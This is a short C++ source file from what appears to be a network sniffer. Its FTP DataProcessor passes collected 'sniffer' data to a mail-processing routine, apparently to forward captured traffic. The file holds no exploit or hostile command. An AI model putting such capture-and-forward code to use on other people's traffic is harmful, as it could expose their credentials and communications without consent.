#include "ftp/data_processor.hpp"

#include "ftp/collected_data.hpp"
#include "util/base64.hpp"
#include "util/file.hpp"
#include "util/mail_process.hpp"

namespace cs {
namespace ftp {

int DataProcessor::process(cs::base::CollectedData* sniffer_data_ptr) {

    CollectedData &sniffer_data = *(dynamic_cast<CollectedData*>(sniffer_data_ptr));
    util::mail_process(sniffer_data.get_data());

    return 1;

}


DataProcessor::~DataProcessor() {}

}
}